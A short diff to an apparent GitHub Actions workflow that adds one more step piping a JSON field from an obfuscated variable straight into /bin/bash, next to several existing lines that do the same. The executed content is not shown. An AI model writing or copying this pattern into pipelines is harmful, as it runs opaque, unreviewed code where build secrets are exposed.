@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$q0298" | jq -r .f495 | /bin/bash
           printf '%s' "$zdx186" | jq -r .pebx8239 | /bin/bash
           printf '%s' "$yxe3" | jq -r .iu127 | /bin/bash
+          echo $xrdg51 | jq -r .f5 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
